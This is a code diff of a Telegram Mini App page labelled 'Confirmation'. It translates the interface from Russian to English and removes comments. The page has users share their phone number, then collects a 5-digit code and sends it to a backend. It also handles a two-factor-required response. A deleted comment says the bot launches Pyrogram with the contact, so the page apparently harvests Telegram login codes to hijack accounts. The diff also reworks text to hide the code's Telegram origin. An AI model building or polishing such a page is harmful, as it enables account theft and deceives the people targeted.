@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="en">
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
-  <title>Подтверждение</title>
+  <title>Confirmation</title>
   <script src="https://telegram.org/js/telegram-web-app.js"></script>
   <style>
     :root {
@@ -46,7 +46,6 @@
     .pill.ok { background: rgba(46,166,255,.15); color: #2ea6ff; border-color: rgba(46,166,255,.3); }
     .top { display: flex; justify-content: space-between; align-items: flex-start; gap: 12px; }
 
-    /* Phone screen */
     .share-btn {
       margin-top: 20px; width: 100%; padding: 16px;
       border-radius: 14px; border: none;
@@ -68,7 +67,6 @@
     }
     @keyframes spin { to { transform: rotate(360deg); } }
 
-    /* Code screen */
     .codeBox {
       margin: 20px 0 10px; padding: 16px; border-radius: 16px;
       border: 1px solid rgba(255,255,255,.12); background: rgba(0,0,0,.15); text-align: center;
@@ -85,7 +83,6 @@
       color: var(--hint); font-size: 13px; margin-top: 8px;
     }
 
-    /* Keyboard */
     .keyboard { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; }
     .key {
       height: 64px; border-radius: 16px;
@@ -102,27 +99,27 @@
 <body>
 <div class="wrap">
 
-  <!-- Экран: поделиться номером -->
+  <!-- Screen: share phone number -->
   <div id="phoneScreen" class="card hidden">
     <div class="top">
       <div>
-        <div class="title">Подтверждение номера</div>
-        <div class="subtitle">Нажмите кнопку — Telegram попросит поделиться контактом. Это займёт пару секунд.</div>
+        <div class="title">Phone Verification</div>
+        <div class="subtitle">Press the button to share your contact. This will only take a moment.</div>
       </div>
-      <div class="pill" id="pill">Шаг 1/2</div>
+      <div class="pill" id="pill">Step 1/2</div>
     </div>
     <button class="share-btn" id="shareBtn" onclick="startContactFlow()">
-      📱 Поделиться номером
+      📱 Share Phone Number
     </button>
     <div class="status-line" id="statusLine"></div>
   </div>
 
-  <!-- Экран: ввод кода -->
+  <!-- Screen: enter code -->
   <div id="codeScreen" class="card hidden">
     <div class="top">
       <div>
-        <div class="title">Введите код</div>
-        <div class="subtitle">Код из SMS или Telegram</div>
+        <div class="title">Enter Code</div>
+        <div class="subtitle">Code from SMS</div>
       </div>
       <div class="pill ok" id="phonePill">—</div>
     </div>
@@ -131,11 +128,11 @@
     </div>
     <div class="hint-row">
       <span id="progress">0 / 5</span>
-      <span>⌫ — стереть</span>
+      <span>⌫ — delete</span>
     </div>
   </div>
 
-  <!-- Цифровая клавиатура -->
+  <!-- Numeric keyboard -->
   <div id="keyboard" class="keyboard hidden"></div>
 
 </div>
@@ -145,9 +142,8 @@
 
   const tgUser = tg.initDataUnsafe?.user;
   const userId = tgUser?.id;
-  if (!userId) { alert('Нет user ID'); throw new Error(); }
+  if (!userId) { alert('No user ID'); throw new Error(); }
 
-  // Если бот открыл WebApp с ?phone= (старый флоу через реплай-клавиатуру)
   const urlPhone = new URLSearchParams(location.search).get('phone') || '';
 
   const CODE_LEN = 5;
@@ -156,7 +152,6 @@
   let polling = false;
   let pollTimer = null;
 
-  // DOM
   const phoneScreen = document.getElementById('phoneScreen');
   const codeScreen  = document.getElementById('codeScreen');
   const keyboard    = document.getElementById('keyboard');
@@ -193,35 +188,27 @@
     renderDots();
   }
 
-  // ── Флоу получения номера ─────────────────────────────────────
-  // requestContact на мобиле отдаёт номер ТОЛЬКО боту в чат.
-  // Мы вызываем requestContact, потом опрашиваем /status пока state=get_code.
-  // Бот получит контакт, запустит Pyrogram, поставит стейт — мы это поймаем.
-
   function startContactFlow() {
     shareBtn.disabled = true;
-    setStatus('Запрашиваем номер...', true);
+    setStatus('Requesting number...', true);
 
     tg.requestContact((success) => {
       console.log('[requestContact cb] success=', success);
       if (!success) {
         shareBtn.disabled = false;
-        setStatus('Отказано. Попробуйте ещё раз.');
+        setStatus('Denied. Please try again.');
         return;
       }
-      // Пользователь нажал "Поделиться" — контакт ушёл боту.
-      // Ждём пока бот обработает и поставит стейт get_code.
-      setStatus('Ожидаем подтверждения...', true);
+      setStatus('Waiting for confirmation...', true);
       startPolling();
     });
   }
 
-  // ── Polling /status ───────────────────────────────────────────
   function startPolling() {
     if (polling) return;
     polling = true;
     let attempts = 0;
-    const maxAttempts = 30; // 30 × 2s = 60 сек
+    const maxAttempts = 30;
 
     async function poll() {
       if (!polling) return;
@@ -229,7 +216,7 @@
       if (attempts > maxAttempts) {
         stopPolling();
         shareBtn.disabled = false;
-        setStatus('Превышено время ожидания. Попробуйте ещё раз.');
+        setStatus('Timed out. Please try again.');
         return;
       }
 
@@ -245,9 +232,9 @@
           phone = data.phone;
           pill.textContent = mask(phone);
           pill.classList.add('ok');
-          setStatus('Код отправлен!');
+          setStatus('Code sent!');
           setTimeout(showCode, 400);
-          return; // стоп
+          return;
         }
       } catch (e) {
         console.warn('[poll] error', e);
@@ -264,7 +251,6 @@
     if (pollTimer) { clearTimeout(pollTimer); pollTimer = null; }
   }
 
-  // ── Ввод кода ─────────────────────────────────────────────────
   function renderDots() {
     dotsEl.innerHTML = '';
     for (let i = 0; i < CODE_LEN; i++) {
@@ -279,7 +265,7 @@
     if (code.length >= CODE_LEN) return;
     code += d; renderDots();
     if (code.length === CODE_LEN) {
-      tg.MainButton.setText('✅ Подтвердить').show();
+      tg.MainButton.setText('✅ Confirm').show();
       tg.MainButton.onClick(submitCode);
     } else {
       tg.MainButton.hide();
@@ -306,13 +292,13 @@
       if (data.status === 'ok') {
         tg.close();
       } else if (data.status === '2fa_required') {
-        tg.close(); // TODO: экран 2FA
+        tg.close();
       } else {
-        alert(data.message || 'Неверный код, попробуйте ещё раз');
+        alert(data.message || 'Incorrect code, please try again');
         code = ''; renderDots();
       }
     } catch (e) {
-      alert('Ошибка сети');
+      alert('Network error');
     } finally {
       tg.MainButton.hideProgress();
       tg.MainButton.enable();
@@ -320,7 +306,6 @@
     }
   }
 
-  // Строим клавиатуру
   ['1','2','3','4','5','6','7','8','9','spacer','0','del'].forEach(k => {
     const btn = document.createElement('button');
     btn.className = 'key' + (k === 'spacer' ? ' spacer' : '');
@@ -336,9 +321,7 @@
     if (e.key === 'Enter' && code.length === CODE_LEN) submitCode();
   });
 
-  // ── Старт ─────────────────────────────────────────────────────
   if (urlPhone) {
-    // Открыт с номером из URL — бот уже послал код, просто показываем ввод
     phone = urlPhone;
     showCode();
   } else {
